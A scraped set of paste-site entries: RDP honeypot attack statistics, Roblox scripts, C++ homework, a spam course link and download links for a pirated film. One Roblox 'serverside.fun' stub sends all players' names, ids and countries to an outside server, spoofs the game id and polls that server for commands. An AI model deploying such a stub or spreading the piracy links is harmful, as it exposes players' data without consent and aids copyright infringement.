jzxyeyWP,2024-01-07_stats.json,rdp_snitch,JSON,Sunday 7th of January 2024 06:18:13 PM CDT,"{
  ""ip"": {
    ""74.105.22.131"": 84,
    ""194.165.17.21"": 63,
    ""45.93.20.204"": 18,
    ""87.251.75.145"": 9,
    ""205.210.31.239"": 9,
    ""13.89.56.19"": 3,
    ""43.128.12.208"": 9,
    ""80.66.76.92"": 6,
    ""87.251.75.64"": 3,
    ""45.227.254.55"": 18,
    ""170.64.218.99"": 3,
    ""216.73.161.66"": 6,
    ""185.170.144.3"": 6,
    ""198.235.24.226"": 9,
    ""45.86.81.112"": 6,
    ""103.221.220.181"": 9,
    ""196.190.117.7"": 6,
    ""87.251.75.120"": 6,
    ""162.142.125.12"": 3,
    ""43.154.91.97"": 3,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""103.184.47.83"": 3,
    ""103.77.246.109"": 6,
    ""193.37.69.213"": 9,
    ""118.193.33.16"": 3,
    ""147.78.47.51"": 6,
    ""205.210.31.249"": 9,
    ""58.218.204.183"": 9,
    ""167.94.138.36"": 3,
    ""123.60.31.31"": 6,
    ""89.248.170.88"": 3,
    ""106.75.210.215"": 3,
    ""213.109.202.232"": 9,
    ""198.235.24.197"": 9
  },
  ""asn"": {
    ""AS701"": 84,
    ""AS48721"": 63,
    ""AS57523"": 18,
    ""AS208091"": 33,
    ""AS396982"": 36,
    ""AS8075"": 3,
    ""AS132203"": 12,
    ""AS267784"": 18,
    ""AS14061"": 3,
    ""AS206092"": 6,
    ""AS197414"": 6,
    ""AS205516"": 6,
    ""AS63760"": 9,
    ""AS24757"": 6,
    ""AS398324"": 6,
    ""AS208046"": 18,
    ""AS146817"": 3,
    ""AS140810"": 6,
    ""AS135377"": 3,
    ""AS209588"": 6,
    ""AS4134"": 9,
    ""AS55990"": 6,
    ""AS202425"": 3,
    ""AS17621"": 3,
    ""AS208312"": 9
  },
  ""isp"": {
    ""Verizon Business"": 84,
    ""Flyservers S.A."": 87,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Xhost Internet Solutions LP"": 30,
    ""Google LLC"": 36,
    ""Microsoft Corporation"": 3,
    ""Aceville Pte.ltd"": 9,
    ""DigitalOcean, LLC"": 3,
    ""Ipxo Limited"": 6,
    ""NLS ASTANA LLP"": 6,
    ""AZDIGI Corporation"": 9,
    ""Ethiotelecom"": 6,
    ""Censys, Inc."": 6,
    ""Shenzhen Tencent Computer Systems Company Limited"": 3,
    ""ColocationX Ltd."": 18,
    ""Hubei Feixun Network Co., Ltd"": 3,
    ""BIDATA"": 6,
    ""Xhost Internet Solutions"": 9,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chinanet"": 9,
    ""Huawei Cloud Service data center"": 6,
    ""IP Volume inc"": 3,
    ""UCLOUD"": 3,
    ""Red Byte LLC"": 9
  },
  ""org"": {
    ""Verizon Business"": 84,
    ""Flyservers S.A"": 69,
    ""Starcrecium Limited"": 18,
    ""Xhost Internet Solutions"": 24,
    ""Palo Alto Networks, Inc"": 36,
    ""Microsoft Azure Cloud (centralus)"": 3,
    ""Unknown"": 21,
    ""UAB Host Baltic"": 18,
    ""DigitalOcean, LLC"": 3,
    ""Bandito Networks"": 6,
    ""Xhostis"": 6,
    ""AZDIGI"": 9,
    ""Censys Inc"": 3,
    ""Tencent Cloud Computing"": 3,
    ""Makut Investments"": 9,
    ""ColocationX Ltd"": 9,
    ""Hubei Feixun Network Co., Ltd"": 3,
    ""Bidata Media and Technology Joint Stock Company"": 6,
    ""XHOSTIS"": 9,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chinanet JS"": 9,
    ""Censys, Inc"": 3,
    ""Huawei Public Cloud Service"": 6,
    ""Quasi Networks LTD."": 3,
    ""Shanghai UCloud Information Technology Company Limited"": 3,
    ""Chang Way Technologies Co. Limited"": 9
  },
  ""regionName"": {
    ""New Jersey"": 84,
    ""Kaunas"": 63,
    ""Moscow"": 27,
    ""North Holland"": 57,
    ""California"": 36,
    ""Iowa"": 3,
    ""Central and Western District"": 15,
    ""Vilnius"": 18,
    ""New South Wales"": 3,
    ""New York"": 6,
    ""Astana"": 6,
    ""Ho Chi Minh"": 9,
    ""Addis Ababa"": 6,
    ""Michigan"": 6,
    ""Virginia"": 9,
    ""Hubei"": 3,
    ""Hanoi"": 6,
    ""Jiangsu"": 9,
    ""Shanghai"": 6,
    ""Beijing"": 3
  },
  ""country"": {
    ""United States"": 144,
    ""Lithuania"": 81,
    ""Russia"": 27,
    ""The Netherlands"": 57,
    ""Hong Kong"": 15,
    ""Australia"": 3,
    ""Kazakhstan"": 6,
    ""Vietnam"": 15,
    ""Ethiopia"": 6,
    ""China"": 21
  },
  ""account"": {
    ""142.93.8.59"": 147,
    ""Domain"": 54,
    ""Administr"": 36,
    ""gyxDTVICk"": 3,
    ""rrvAEK"": 3,
    ""gJZZjb"": 3,
    ""Almaz"": 3,
    ""hello"": 48,
    ""Test"": 33,
    ""(empty)"": 15,
    ""vccSTBtRa"": 3,
    ""dFrrrw"": 3,
    ""jFpfuO"": 3,
    ""Administrator"": 3,
    ""ZEPRAX"": 3,
    ""TYBIpwFAc"": 3,
    ""arRIMj"": 3,
    ""NdyWregma"": 3,
    ""MDtvPU"": 3,
    ""RWxWky"": 3
  },
  ""keyboard"": {
    ""Unknown"": 375
  },
  ""client_build"": {
    ""Unknown"": 375
  },
  ""client_name"": {
    ""Unknown"": 375
  },
  ""ip_type"": {
    ""Unknown"": 270,
    ""proxy"": 18,
    ""hosting"": 69,
    ""mobile & proxy"": 6,
    ""mobile"": 9,
    ""hosting & proxy"": 3
  }
}"
g68GwyKG,2024-01-07_stats.json,rdp_snitch,JSON,Sunday 7th of January 2024 06:16:05 PM CDT,"{
  ""ip"": {
    ""74.105.22.131"": 56,
    ""194.165.17.21"": 42,
    ""45.93.20.204"": 12,
    ""87.251.75.145"": 6,
    ""205.210.31.239"": 6,
    ""13.89.56.19"": 2,
    ""43.128.12.208"": 6,
    ""80.66.76.92"": 4,
    ""87.251.75.64"": 2,
    ""45.227.254.55"": 12,
    ""170.64.218.99"": 2,
    ""216.73.161.66"": 4,
    ""185.170.144.3"": 4,
    ""198.235.24.226"": 6,
    ""45.86.81.112"": 4,
    ""103.221.220.181"": 6,
    ""196.190.117.7"": 4,
    ""87.251.75.120"": 4,
    ""162.142.125.12"": 2,
    ""43.154.91.97"": 2,
    ""185.196.220.41"": 6,
    ""193.142.146.227"": 6,
    ""103.184.47.83"": 2,
    ""103.77.246.109"": 4,
    ""193.37.69.213"": 6,
    ""118.193.33.16"": 2,
    ""147.78.47.51"": 4,
    ""205.210.31.249"": 6,
    ""58.218.204.183"": 6,
    ""167.94.138.36"": 2,
    ""123.60.31.31"": 4,
    ""89.248.170.88"": 2,
    ""106.75.210.215"": 2,
    ""213.109.202.232"": 6,
    ""198.235.24.197"": 6
  },
  ""asn"": {
    ""AS701"": 56,
    ""AS48721"": 42,
    ""AS57523"": 12,
    ""AS208091"": 22,
    ""AS396982"": 24,
    ""AS8075"": 2,
    ""AS132203"": 8,
    ""AS267784"": 12,
    ""AS14061"": 2,
    ""AS206092"": 4,
    ""AS197414"": 4,
    ""AS205516"": 4,
    ""AS63760"": 6,
    ""AS24757"": 4,
    ""AS398324"": 4,
    ""AS208046"": 12,
    ""AS146817"": 2,
    ""AS140810"": 4,
    ""AS135377"": 2,
    ""AS209588"": 4,
    ""AS4134"": 6,
    ""AS55990"": 4,
    ""AS202425"": 2,
    ""AS17621"": 2,
    ""AS208312"": 6
  },
  ""isp"": {
    ""Verizon Business"": 56,
    ""Flyservers S.A."": 58,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Xhost Internet Solutions LP"": 20,
    ""Google LLC"": 24,
    ""Microsoft Corporation"": 2,
    ""Aceville Pte.ltd"": 6,
    ""DigitalOcean, LLC"": 2,
    ""Ipxo Limited"": 4,
    ""NLS ASTANA LLP"": 4,
    ""AZDIGI Corporation"": 6,
    ""Ethiotelecom"": 4,
    ""Censys, Inc."": 4,
    ""Shenzhen Tencent Computer Systems Company Limited"": 2,
    ""ColocationX Ltd."": 12,
    ""Hubei Feixun Network Co., Ltd"": 2,
    ""BIDATA"": 4,
    ""Xhost Internet Solutions"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Chinanet"": 6,
    ""Huawei Cloud Service data center"": 4,
    ""IP Volume inc"": 2,
    ""UCLOUD"": 2,
    ""Red Byte LLC"": 6
  },
  ""org"": {
    ""Verizon Business"": 56,
    ""Flyservers S.A"": 46,
    ""Starcrecium Limited"": 12,
    ""Xhost Internet Solutions"": 16,
    ""Palo Alto Networks, Inc"": 24,
    ""Microsoft Azure Cloud (centralus)"": 2,
    ""Unknown"": 14,
    ""UAB Host Baltic"": 12,
    ""DigitalOcean, LLC"": 2,
    ""Bandito Networks"": 4,
    ""Xhostis"": 4,
    ""AZDIGI"": 6,
    ""Censys Inc"": 2,
    ""Tencent Cloud Computing"": 2,
    ""Makut Investments"": 6,
    ""ColocationX Ltd"": 6,
    ""Hubei Feixun Network Co., Ltd"": 2,
    ""Bidata Media and Technology Joint Stock Company"": 4,
    ""XHOSTIS"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Chinanet JS"": 6,
    ""Censys, Inc"": 2,
    ""Huawei Public Cloud Service"": 4,
    ""Quasi Networks LTD."": 2,
    ""Shanghai UCloud Information Technology Company Limited"": 2,
    ""Chang Way Technologies Co. Limited"": 6
  },
  ""regionName"": {
    ""New Jersey"": 56,
    ""Kaunas"": 42,
    ""Moscow"": 18,
    ""North Holland"": 38,
    ""California"": 24,
    ""Iowa"": 2,
    ""Central and Western District"": 10,
    ""Vilnius"": 12,
    ""New South Wales"": 2,
    ""New York"": 4,
    ""Astana"": 4,
    ""Ho Chi Minh"": 6,
    ""Addis Ababa"": 4,
    ""Michigan"": 4,
    ""Virginia"": 6,
    ""Hubei"": 2,
    ""Hanoi"": 4,
    ""Jiangsu"": 6,
    ""Shanghai"": 4,
    ""Beijing"": 2
  },
  ""country"": {
    ""United States"": 96,
    ""Lithuania"": 54,
    ""Russia"": 18,
    ""The Netherlands"": 38,
    ""Hong Kong"": 10,
    ""Australia"": 2,
    ""Kazakhstan"": 4,
    ""Vietnam"": 10,
    ""Ethiopia"": 4,
    ""China"": 14
  },
  ""account"": {
    ""142.93.8.59"": 98,
    ""Domain"": 36,
    ""Administr"": 24,
    ""gyxDTVICk"": 2,
    ""rrvAEK"": 2,
    ""gJZZjb"": 2,
    ""Almaz"": 2,
    ""hello"": 32,
    ""Test"": 22,
    ""(empty)"": 10,
    ""vccSTBtRa"": 2,
    ""dFrrrw"": 2,
    ""jFpfuO"": 2,
    ""Administrator"": 2,
    ""ZEPRAX"": 2,
    ""TYBIpwFAc"": 2,
    ""arRIMj"": 2,
    ""NdyWregma"": 2,
    ""MDtvPU"": 2,
    ""RWxWky"": 2
  },
  ""keyboard"": {
    ""Unknown"": 250
  },
  ""client_build"": {
    ""Unknown"": 250
  },
  ""client_name"": {
    ""Unknown"": 250
  },
  ""ip_type"": {
    ""Unknown"": 180,
    ""proxy"": 12,
    ""hosting"": 46,
    ""mobile & proxy"": 4,
    ""mobile"": 6,
    ""hosting & proxy"": 2
  }
}"
VSdUhzAz,2024-01-07_stats.json,rdp_snitch,JSON,Sunday 7th of January 2024 06:15:09 PM CDT,"{
  ""ip"": {
    ""74.105.22.131"": 28,
    ""194.165.17.21"": 21,
    ""45.93.20.204"": 6,
    ""87.251.75.145"": 3,
    ""205.210.31.239"": 3,
    ""13.89.56.19"": 1,
    ""43.128.12.208"": 3,
    ""80.66.76.92"": 2,
    ""87.251.75.64"": 1,
    ""45.227.254.55"": 6,
    ""170.64.218.99"": 1,
    ""216.73.161.66"": 2,
    ""185.170.144.3"": 2,
    ""198.235.24.226"": 3,
    ""45.86.81.112"": 2,
    ""103.221.220.181"": 3,
    ""196.190.117.7"": 2,
    ""87.251.75.120"": 2,
    ""162.142.125.12"": 1,
    ""43.154.91.97"": 1,
    ""185.196.220.41"": 3,
    ""193.142.146.227"": 3,
    ""103.184.47.83"": 1,
    ""103.77.246.109"": 2,
    ""193.37.69.213"": 3,
    ""118.193.33.16"": 1,
    ""147.78.47.51"": 2,
    ""205.210.31.249"": 3,
    ""58.218.204.183"": 3,
    ""167.94.138.36"": 1,
    ""123.60.31.31"": 2,
    ""89.248.170.88"": 1,
    ""106.75.210.215"": 1,
    ""213.109.202.232"": 3,
    ""198.235.24.197"": 3
  },
  ""asn"": {
    ""AS701"": 28,
    ""AS48721"": 21,
    ""AS57523"": 6,
    ""AS208091"": 11,
    ""AS396982"": 12,
    ""AS8075"": 1,
    ""AS132203"": 4,
    ""AS267784"": 6,
    ""AS14061"": 1,
    ""AS206092"": 2,
    ""AS197414"": 2,
    ""AS205516"": 2,
    ""AS63760"": 3,
    ""AS24757"": 2,
    ""AS398324"": 2,
    ""AS208046"": 6,
    ""AS146817"": 1,
    ""AS140810"": 2,
    ""AS135377"": 1,
    ""AS209588"": 2,
    ""AS4134"": 3,
    ""AS55990"": 2,
    ""AS202425"": 1,
    ""AS17621"": 1,
    ""AS208312"": 3
  },
  ""isp"": {
    ""Verizon Business"": 28,
    ""Flyservers S.A."": 29,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Xhost Internet Solutions LP"": 10,
    ""Google LLC"": 12,
    ""Microsoft Corporation"": 1,
    ""Aceville Pte.ltd"": 3,
    ""DigitalOcean, LLC"": 1,
    ""Ipxo Limited"": 2,
    ""NLS ASTANA LLP"": 2,
    ""AZDIGI Corporation"": 3,
    ""Ethiotelecom"": 2,
    ""Censys, Inc."": 2,
    ""Shenzhen Tencent Computer Systems Company Limited"": 1,
    ""ColocationX Ltd."": 6,
    ""Hubei Feixun Network Co., Ltd"": 1,
    ""BIDATA"": 2,
    ""Xhost Internet Solutions"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Chinanet"": 3,
    ""Huawei Cloud Service data center"": 2,
    ""IP Volume inc"": 1,
    ""UCLOUD"": 1,
    ""Red Byte LLC"": 3
  },
  ""org"": {
    ""Verizon Business"": 28,
    ""Flyservers S.A"": 23,
    ""Starcrecium Limited"": 6,
    ""Xhost Internet Solutions"": 8,
    ""Palo Alto Networks, Inc"": 12,
    ""Microsoft Azure Cloud (centralus)"": 1,
    ""Unknown"": 7,
    ""UAB Host Baltic"": 6,
    ""DigitalOcean, LLC"": 1,
    ""Bandito Networks"": 2,
    ""Xhostis"": 2,
    ""AZDIGI"": 3,
    ""Censys Inc"": 1,
    ""Tencent Cloud Computing"": 1,
    ""Makut Investments"": 3,
    ""ColocationX Ltd"": 3,
    ""Hubei Feixun Network Co., Ltd"": 1,
    ""Bidata Media and Technology Joint Stock Company"": 2,
    ""XHOSTIS"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Chinanet JS"": 3,
    ""Censys, Inc"": 1,
    ""Huawei Public Cloud Service"": 2,
    ""Quasi Networks LTD."": 1,
    ""Shanghai UCloud Information Technology Company Limited"": 1,
    ""Chang Way Technologies Co. Limited"": 3
  },
  ""regionName"": {
    ""New Jersey"": 28,
    ""Kaunas"": 21,
    ""Moscow"": 9,
    ""North Holland"": 19,
    ""California"": 12,
    ""Iowa"": 1,
    ""Central and Western District"": 5,
    ""Vilnius"": 6,
    ""New South Wales"": 1,
    ""New York"": 2,
    ""Astana"": 2,
    ""Ho Chi Minh"": 3,
    ""Addis Ababa"": 2,
    ""Michigan"": 2,
    ""Virginia"": 3,
    ""Hubei"": 1,
    ""Hanoi"": 2,
    ""Jiangsu"": 3,
    ""Shanghai"": 2,
    ""Beijing"": 1
  },
  ""country"": {
    ""United States"": 48,
    ""Lithuania"": 27,
    ""Russia"": 9,
    ""The Netherlands"": 19,
    ""Hong Kong"": 5,
    ""Australia"": 1,
    ""Kazakhstan"": 2,
    ""Vietnam"": 5,
    ""Ethiopia"": 2,
    ""China"": 7
  },
  ""account"": {
    ""142.93.8.59"": 49,
    ""Domain"": 18,
    ""Administr"": 12,
    ""gyxDTVICk"": 1,
    ""rrvAEK"": 1,
    ""gJZZjb"": 1,
    ""Almaz"": 1,
    ""hello"": 16,
    ""Test"": 11,
    ""(empty)"": 5,
    ""vccSTBtRa"": 1,
    ""dFrrrw"": 1,
    ""jFpfuO"": 1,
    ""Administrator"": 1,
    ""ZEPRAX"": 1,
    ""TYBIpwFAc"": 1,
    ""arRIMj"": 1,
    ""NdyWregma"": 1,
    ""MDtvPU"": 1,
    ""RWxWky"": 1
  },
  ""keyboard"": {
    ""Unknown"": 125
  },
  ""client_build"": {
    ""Unknown"": 125
  },
  ""client_name"": {
    ""Unknown"": 125
  },
  ""ip_type"": {
    ""Unknown"": 90,
    ""proxy"": 6,
    ""hosting"": 23,
    ""mobile & proxy"": 2,
    ""mobile"": 3,
    ""hosting & proxy"": 1
  }
}"
u8ANiWXu,Serverside.fun Stub Module Script (with custom logging),darraghd493,Lua,Sunday 7th of January 2024 06:00:22 PM CDT,"--[[
How to use this:
 - Fill out the settings (I suggest you leave SCRIPT_LOGGING on)
 - Create a game with this inserted into it (must be published & running on Roblox, no studio)
 - Done! :)
]]

-- Settings
local WHITELIST_USERNAME = """" -- Roblox username (whitelisted)
local WHITELIST_USER_ID = -1 -- Roblox user id (whitelisted)
local WHITELIST_GAME_ID = game.GameId -- Roblox game id (fakes what game your in)
local SCRIPT_LOGGING = true -- Whether you want scripts executed to be logged to the serverside.fun (WARNING: POTENTIALLY DANGEROUS!)
local CUSTOM_LOGGING_URL = """" -- URL to log custom scripts to

-- Variables
local GET_PLAYERS_URL = ""https://api.serverside.fun/v1/get-players""

local LocalisationService = game:GetService(""LocalizationService"")
local HttpService = game:GetService(""HttpService"")
local Players = game:GetService(""Players"")

-- Stub
local response = HttpService:GetAsync(""https://api.serverside.fun/v1/check-whitelist/"" .. WHITELIST_USER_ID .. ""/"" .. tostring(WHITELIST_GAME_ID))
local user_data = HttpService:JSONDecode(response)

print(response) -- Used for testing (check output in server console)

if user_data.whitelisted ~= false then
	local function getPlayerData()
		local playerData = {}
		for i, v in ipairs(Players:GetPlayers()) do
			local country = ""Unknown""
			pcall(function()
				country = LocalisationService:GetCountryRegionForPlayerAsync(v)
			end)
			table.insert(playerData, {username = v.Name, userid = v.UserId, displayName = v.DisplayName, country = country})
		end
		return playerData
	end

	local function postPlayerData()
		task.wait(0.5)
		if Players:FindFirstChild(WHITELIST_USERNAME) then
			HttpService:PostAsync(GET_PLAYERS_URL, HttpService:JSONEncode({value = getPlayerData(), robloxId = WHITELIST_USER_ID}))
		end
	end

	local posted_removing_1 = true
	local posted_removing_2 = false

	local function postPlayerRemovingData()
		task.wait(1)
		if Players:FindFirstChild(WHITELIST_USERNAME) and posted_removing_1 == true then
			postPlayerData()
		else
			posted_removing_1 = false
			if posted_removing_2 == false then
				HttpService:PostAsync(GET_PLAYERS_URL, HttpService:JSONEncode({value = {}, robloxId = WHITELIST_USER_ID}))
				posted_removing_2 = true
			end
		end
	end

	pcall(function()
		postPlayerData()
		Players.PlayerAdded:Connect(postPlayerData)
		Players.PlayerRemoving:Connect(postPlayerRemovingData)
	end)

	-- Premium script polling
	if user_data.type ~= ""NORMAL"" then
		pcall(function()
			local premium_script_poll_data = HttpService:JSONDecode(HttpService:GetAsync(""https://api.serverside.fun/v1/private-scripts/"" .. WHITELIST_USER_ID))
			for i, v in ipairs(premium_script_poll_data.scripts) do
				pcall(function()
					if v == ""r6()"" then
						print(""premium r6 stub (3436957371)"")
					elseif v == ""re()"" then
						print(""premium reset stub (load character)"")
					elseif v:match(""USERNAME"") then
						print(""premium hub/custom stub ("" .. tostring(v) .. "")"")
						if CUSTOM_LOGGING_URL ~= """" then
							HttpService:PostAsync(CUSTOM_LOGGING_URL, tostring(v))
						end
					else
						print(""premium custom stub ("" .. tostring(v) .. "")"")
						HttpService:PostAsync(CUSTOM_LOGGING_URL, tostring(v))
					end
				end)
			end
		end)
	end

	-- Normal script polling
	local script_poll_url = ""https://api.serverside.fun/v1/long-polling/kkwAhfSFRnAyAoffQYNEEviBUAVs/"" .. WHITELIST_USER_ID
	while true do
		local success, error = pcall(HttpService.GetAsync, HttpService, script_poll_url)
		if success then
			local success_2, error_2 = pcall(HttpService.JSONDecode, HttpService, error)
			if success_2 then
				if error_2 and error_2[""script""] then
					if Players:FindFirstChild(WHITELIST_USERNAME) then
						local polled_script = error_2[""script""].script
						if WHITELIST_USER_ID == tonumber(error_2[""script""].robloxId) then
							if polled_script == ""r6()"" then
								print(""r6 stub (3436957371)"")
							elseif polled_script == ""re()"" then
								print(""reset stub (load character)"")
							elseif polled_script:match(""USERNAME"") then
								print(""hub/custom stub ("" .. tostring(polled_script) .. "")"")
								HttpService:PostAsync(CUSTOM_LOGGING_URL, tostring(polled_script))
							else
								print(""custom stub ("" .. tostring(polled_script) .. "")"")
								HttpService:PostAsync(CUSTOM_LOGGING_URL, tostring(polled_script))
							end
							
							if SCRIPT_LOGGING then
								pcall(function()
									HttpService:PostAsync(""https://api.serverside.fun/v1/script-logs"", HttpService:JSONEncode({
										[""script""] = polled_script,
										[""robloxId""] = tostring(WHITELIST_USER_ID),
										[""gameId""] = tostring(WHITELIST_GAME_ID)
									}))
								end)
							end
						end
					end
				end
			end
		end
		task.wait()
	end
end
"
vkJHYPau,Untitled,sissou123,PHP,Sunday 7th of January 2024 05:34:41 PM CDT,"PHP with MySQL- Procedural Part
Learn to Code in PHP Procedural way in an easy and understandable way by following from basics to using MySQL with PHP 
This course covers PHP and MySQL from Very Beginning that even anybody who has never Programmed can take the concepts from this course easily(I believe).If you want to Learn PHP Programming from Scratch then This course might be the good guide for you 
for more:https://cuty.io/VMacf
"
fg33Sz7w,Einer.von.Uns.2015.Deu.720p.h264.eac3.Subs-bp,bpmircea,BrainFuck,Sunday 7th of January 2024 05:14:19 PM CDT,"Einer von uns (One of Us) (Stephan Richter, 2015)
aka
Einer.von.Uns.2015.Deu.720p.h264.eac3.Subs-bp
https://www.imdb.com/title/tt4939866/

http://up-4.net/d/sVDG
https://filecrypt.cc/Container/3C15F1BDD7.html
https://t.me/DeuFree/1470

Audio tracks: de-AT | Subtitles: de-AT en"
zv5XaaQm,k4.cpp,pan7nikt,C++,Sunday 7th of January 2024 05:12:58 PM CDT,"#include <iostream>
#include <fstream>

using namespace std;

struct warzywo
{
    char rodzaj [30];
    int jakosc;
    float masa;
};


//Zadanie 2
warzywo** tablicadyn(int x, int y)
{
    warzywo **tab = new warzywo*[x];
    for(int i=0; i<y; i++)
    {
        tab[i] = new warzywo[x];
    }
    return tab;
}

//Zadanie 3
void pobieranie(warzywo& w)
{
    char rodzaj[30] = """";
    int jakosc = 0;
    float masa = 0.0;

    cout << ""Podaj rodzaj: "";
    cin >> w.rodzaj;
    cout << ""\nPodaj jakosc: "";
    cin >> jakosc;
    cout << ""\nPodaj mase: "";
    cin >> masa;

    w.jakosc = jakosc;
    w.masa = masa;
}

//Zadanie 4
bool zapis(warzywo w[], int rozmiar, string nazwa)
{
    ofstream plik(nazwa);
    if(!plik){return false;}
    for(int i=0;i<rozmiar;i++)
    {
        plik << w[i].rodzaj << "" "" << w[i].jakosc << "" "" << w[i].masa << "" "" << endl;
    }
    return true;
}

//Zadanie 5 (sprawd≈∫ parzysto≈õƒá bit√≥w w int)
bool parzyste(int x)
{
    int parzysta = 0;
    while(x > 0)
    {
        //parzysta + AND z pierwszego bitu z jedynkƒÖ (robimy licznik jedynek)
        parzysta = parzysta + (x & 1);
        //Bit shift o jednƒÖ w prawo (np. 0110 -> 0011)
        x >>= 1;
    }
    //DEBUG
    //cout << ""Parzysta: "" << parzysta << ""\n"";

    //Reszta dzielenia z sumy jedynek przez 2
    parzysta = parzysta % 2;

    //DEBUG
    //cout << ""Parzysta po mod: "" << parzysta << ""\n"";

    //Zwracamy odwr√≥conƒÖ warto≈õƒá (bo reszta jest 1 jak liczba jest nieparzysta, a my chcemy na odwr√≥t)
    return parzysta;
}

int main()
{
//Zad 5
cout << parzyste(3);

//Zad 1

    warzywo w;
pobieranie(w);
cout << ""\nRodzaj to: "" << w.rodzaj;
cout << ""\nJakosc to: "" << w.jakosc;
cout << ""\nMasa to: "" << w.masa;

//Dane do zadania 4
string nazwa;
int rozmiar = 3;
warzywo warzywa[3];

for(int i=0;i<rozmiar;i++)
{
    cout << ""Podaj rodzaj: "";
    cin >> warzywa[i].rodzaj;
    cout << ""\nPodaj jakosc: "";
    cin >> warzywa[i].jakosc;
    cout << ""\nPodaj mase: "";
    cin >> warzywa[i].masa;
};

cout << ""\nPodaj nazwe pliku: "";
cin >> nazwa;
cout << ""\nPodaj rozmiar tablicy warzyw: "";
zapis(warzywa, rozmiar, nazwa);
system(""pause"");
}
"
AeP6fJ3m,Untitled,Alexplazz,Lua,Sunday 7th of January 2024 04:46:39 PM CDT,"local Team = {}
Team.__index = Team

function Team.new(TeamName, Template)
	local NewTeam = setmetatable({}, Team)
	NewTeam.AtWarWith = false
	NewTeam.Name = TeamName
	NewTeam.MaxSoldiers = math.huge
	NewTeam.TemplateCharacter = game.ServerStorage.NPC or Template
	NewTeam.Soldiers = {}
	NewTeam.SpawnPad = false
	return NewTeam
end

function Team:AddSoldier(Soldier)
	table.insert(self.Soldiers, Soldier)
end


return Team"
V31wRHaw,Untitled,Alexplazz,Lua,Sunday 7th of January 2024 04:46:17 PM CDT,"local Soldier, Names = {}, require(game.ReplicatedStorage.Names)
local SoldierID = 0
local SoldierActions = require(script.SoldierActions)
local Hats = game.ServerStorage.Hats:GetChildren()
Soldier.__index = Soldier

function Soldier.new(Team)
	SoldierID += 1
	-- Create object.
	local NewSoldier = setmetatable({}, Soldier)
	NewSoldier.Name = Names[math.random(1, #Names)]
	
	-- Attributes
	NewSoldier.OnDuty = true
	NewSoldier.SoldierID = SoldierID
	
	-- Give character.
	local newCharacter = Team.TemplateCharacter:Clone()
	newCharacter.Name = NewSoldier.Name
	newCharacter.Humanoid.DisplayName = NewSoldier.Name
	newCharacter.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
	NewSoldier.Character = newCharacter
	NewSoldier.Character:SetAttribute(""Break"", false)
	
	-- Give random hat.
	local randHat = Hats[math.random(1, #Hats)]:Clone()
	randHat.Parent = newCharacter
	
	-- Character is ready.
	newCharacter.Parent = workspace

	-- SpawnPad
	if Team.SpawnPad then
		newCharacter:MoveTo(Team.SpawnPad.Position)
	end
	
	-- Add to team.
	if Team then
		Team:AddSoldier(NewSoldier)
	end
	
	coroutine.wrap(function()
		NewSoldier:HeartLoop(Team.AtWarWith)
	end)()
	
	return NewSoldier
end

function Soldier:Die()
	self.OnDuty = false
	wait(2)
	self.Character:Destroy()
end

function Soldier:DistanceTo(Part)
	local PrimaryPart = self.Character.PrimaryPart
	if PrimaryPart then
		local CurrentPosition = PrimaryPart.Position
		local EndPosition = Part.Position
		local Direction = EndPosition - CurrentPosition
		return Direction.Magnitude
	end
end

function Soldier:FindClosestEnemy(EnemyTeam)
	local ClosestStuds, ClosestEnemy = math.huge, false
	for _, EnemySoldier in pairs(EnemyTeam.Soldiers) do
		local Character = EnemySoldier.Character
		if Character and Character.PrimaryPart then
			local Distance = self:DistanceTo(Character.PrimaryPart)
			if Distance < ClosestStuds then
				if Character.Humanoid.Health > 1 then
					ClosestStuds = Distance
					ClosestEnemy = EnemySoldier
				end
			end
		end
	end
	return ClosestEnemy
end

local IdleRange = 5
function Soldier:Idle()
	local Character, Position = self.Character, self.Character.PrimaryPart.Position
	if math.random(1,5) == 1 then

		local X = Position.X + math.random(-IdleRange, IdleRange)
		local Z = Position.Z + math.random(-IdleRange, IdleRange)

		Position = Vector3.new(X, Position.Y, Z)

		Character.Humanoid:MoveTo(Position)
	end
end

function Soldier:FindPath(Target)
	local Path = game:GetService(""PathfindingService""):CreatePath({
		AgentCanJump = true
	})

	Path:ComputeAsync(self.Character.PrimaryPart.Position, Target.Character.PrimaryPart.Position)
	local Waypoints = Path:GetWaypoints()

	if Path.Status == Enum.PathStatus.Success then
		for _, v in ipairs(Waypoints) do
			if v.Action == Enum.PathWaypointAction.Jump then
				self.Character.Humanoid.Jump = true
			end
			self.Character.Humanoid:MoveTo(v.Position)
			local TimeOut = self.Character.Humanoid.MoveToFinished:Wait(1)
			-- TimeOut
			if not TimeOut then
				print(""Path too long!"")
				self:FindPath(Target)
				break
			end
			
			-- CheckSight
			if (not self.Character.PrimaryPart) or (not Target.Character.PrimaryPart) then
				return	
			end
			
			if (self.Character.PrimaryPart.Position - Target.Character.PrimaryPart.Position).magnitude < 10 then
				Target.Character.Humanoid:TakeDamage(10)
				if Target.Character.Humanoid.Health < 1 then
					Target:Die()
					return
				end
			end 
			
			-- Can the soldier currently make a kill?
			
			
			if (self.Character.PrimaryPart.Position - Waypoints[1].Position).magnitude > 20 then
				print(""Target has moved."")
				self:FindPath(Target)
				break
			end
		end
	end
end

function Soldier:Heartbeat(EnemyTeam)
	local Target = self:FindClosestEnemy(EnemyTeam)
	if Target then
		self:FindPath(Target)
		print(""Busy"")
	else
		print(""Bored"")
		self:Idle()
	end
end

function Soldier:HeartLoop(EnemyTeam)
	while wait(0.1) do
		if not self.OnDuty then break end
		if self.Character.Humanoid.Health < 1 then
			break
		end

		self:Heartbeat(EnemyTeam)
	end

end

return Soldier
"
V1xHnAPr,Leaderstats Script,Fr4st3yyt,Lua,Sunday 7th of January 2024 03:52:27 PM CDT,"game.Players.PlayerAdded:Connect(function(player)
	
	local leaderstats = Instance.new(""Folder"",player)
